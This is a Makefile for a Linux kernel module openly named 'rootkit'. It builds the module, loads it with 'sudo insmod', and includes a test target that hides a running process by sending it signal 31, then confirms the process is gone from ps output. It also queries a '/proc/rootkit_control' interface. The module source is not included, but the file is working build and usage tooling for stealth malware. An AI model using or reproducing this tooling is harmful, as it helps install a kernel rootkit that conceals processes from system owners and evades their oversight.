obj-m += rootkit.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

install:
	sudo insmod rootkit.ko

remove:
	sudo rmmod rootkit

reload: remove install

test:
	@echo "testing rootkit"
	@echo "starting test process"
	@sleep 1000 &
	@echo "Test PID: $$!"
	@echo ""
	@echo "process is visible"
	@ps aux | grep sleep | grep -v grep
	@echo ""
	@echo "hiding process with PID"
	@kill -31 $$!
	@echo ""
	@echo "process should be hidden now"
	@ps aux | grep sleep | grep -v grep || echo "process hidden"
	@echo ""
	@echo "check rootkit status:"
	@cat /proc/rootkit_control

dmesg:
	sudo dmesg | tail -20

status:
	@lsmod | grep rootkit || echo "module not loaded"
	@ls -la /proc/rootkit_control 2>/dev/null || echo "control file not found"
